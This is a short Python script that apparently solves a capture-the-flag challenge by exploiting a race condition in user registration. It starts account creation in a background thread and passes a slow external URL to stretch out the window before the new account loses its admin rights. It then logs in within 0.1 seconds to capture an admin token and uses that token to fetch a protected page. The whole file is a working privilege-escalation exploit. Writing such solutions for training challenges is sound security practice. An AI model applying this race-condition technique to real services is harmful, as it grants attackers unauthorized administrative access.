import threading
import time
from datetime import datetime
from uuid import uuid4

import requests

# user is created as admin, you just need to login before user is down-privileged


def beat_chall():
    HOST = "https://gottagofast.challenges.cfd"
    USERNAME = str(uuid4())
    PASSWORD = "temppass"

    def create_user():
        t0 = datetime.now()
        resp = requests.put(
            HOST + "/users",
            json={
                "username": USERNAME,
                "password": PASSWORD,
                "page": "https://www.minew.com/product/g1-iot-gateway/",  # slow url to give us more time
            },
            timeout=5,
        )

        timedelta = datetime.now() - t0

        print("got response after:", timedelta.total_seconds())

        return resp

    threading.Thread(target=create_user).start()
    time.sleep(0.1)  # enough time for user creation

    resp = requests.post(
        HOST + "/users/login",
        json={
            "username": USERNAME,
            "password": PASSWORD,
        },
        timeout=30,
    )

    resp_json = resp.json()
    auth_token = resp_json["X-AUTH-TOKEN"]
    print("token:", auth_token)

    resp = requests.get(
        HOST + "/users/page/sonic",
        headers={"X-AUTH-TOKEN": auth_token},
        timeout=5,
    )

    print(resp.status_code)
    print(resp.text)


for _ in range(1):
    threading.Thread(target=beat_chall).start()
